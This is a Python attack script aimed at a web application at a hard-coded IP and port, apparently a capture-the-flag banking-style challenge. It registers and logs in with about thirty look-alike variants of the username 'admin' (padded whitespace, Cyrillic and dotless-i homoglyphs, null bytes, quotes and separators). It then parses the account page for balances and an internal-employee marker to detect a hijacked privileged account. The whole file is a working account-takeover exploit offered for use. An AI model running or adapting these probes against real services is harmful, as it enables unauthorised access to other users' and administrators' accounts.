import urllib.request, urllib.parse, http.cookiejar, re, time

BASE = "http://103.163.47.230:33663"


def sess():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op


def req(op, p, data=None, method=None, hdrs=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    h = {}
    if body is not None:
        h["Content-Type"] = "application/x-www-form-urlencoded"
    h.update(hdrs or {})
    r = urllib.request.Request(BASE + p, data=body, headers=h, method=method)
    try:
        resp = op.open(r, timeout=15)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)


def clean(b):
    b = re.sub(r"<style.*?</style>", "", b, flags=re.S)
    b = re.sub(r"<script.*?</script>", "", b, flags=re.S)
    b = re.sub(r"<[^>]+>", " ", b)
    b = re.sub(r"&[a-z#0-9]+;", " ", b)
    return re.sub(r"\s+", " ", b).strip()


PWSUF = str(int(time.time()) % 10000)
CAND = [
    "admin", "Admin", "ADMIN", "admin ", " admin", "admin\t", "admin\n",
    "admin ", "admin  ", "admın", "аdmin", "admin%20", "admin\x00zz",
    "admin'", "admin\"", "admin`", "admin;", "admin,", "admin|",
    "admin ", "admin ", "admin　", "admin\r", "admin\x0b", "admin\x0c",
    "admin-", "admin_", "admin.", "admin!", "admin%00",
]

for u in CAND:
    op = sess()
    pw = "pw" + PWSUF
    s, b = req(op, "/register", {"username": u, "password": pw}, "POST")
    t = clean(b)
    reg = t[:90]
    s2, b2 = req(op, "/login", {"username": u, "password": pw}, "POST")
    t2 = clean(b2)
    ok = "我的账户" in t2
    mark = "LOGIN-OK" if ok else "login-fail"
    extra = ""
    if ok:
        m = re.search(r"我的账户（(.*?)）", t2)
        who = m.group(1) if m else "?"
        bal = re.search(r"(\d+) 存款余额", t2)
        cash = re.search(r"(\d+) 现金金币", t2)
        extra = f" as={who!r} dep={bal.group(1) if bal else '?'} cash={cash.group(1) if cash else '?'}"
        if "内部员工" not in t2 or "暂不可用" not in t2:
            extra += "  !!!EMPLOYEE!!!"
    print(f"{u!r:20s} reg={s} {reg[:50]:50s} | {mark}{extra}")
